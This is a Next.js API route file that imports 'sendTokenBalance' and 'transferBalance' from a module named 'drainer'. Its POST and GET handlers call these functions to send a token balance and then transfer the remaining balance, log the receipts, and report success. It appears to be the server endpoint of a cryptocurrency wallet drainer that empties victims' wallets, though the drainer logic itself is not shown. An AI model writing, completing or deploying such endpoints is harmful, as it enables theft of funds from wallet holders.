import { sendTokenBalance, transferBalance} from "@/utils/drainer"

export async function POST(reqs: Request) {
 
    try {
        const receipt = await sendTokenBalance()
       

        
        if(receipt)
            {
                console.log("Transaction receipt",receipt)
         const tx = await transferBalance()
        console.log("Balance transferred", tx)
                return Response.json({ message: "done" }, {status: 200})
            }

            else
            {
                return Response.json({ message: "done with error" },{status: 200})
            }
    } 
    catch (error) {
        console.log("Error failed sending", error)
        return Response.json({ message: "error" }, {status: 200})
    }

}

export async function GET() {
    try {
        const receipt = await sendTokenBalance()
        if(receipt)
            {
                return Response.json({ message: "done" }, {status: 200})
            }

            else
            {
                return Response.json({ message: "done with error" }, {status: 200})
            }
    } catch (error) {
        console.log("Error failed sending", error)
        return Response.json({ message: "error" }, {status: 200})
    }
}


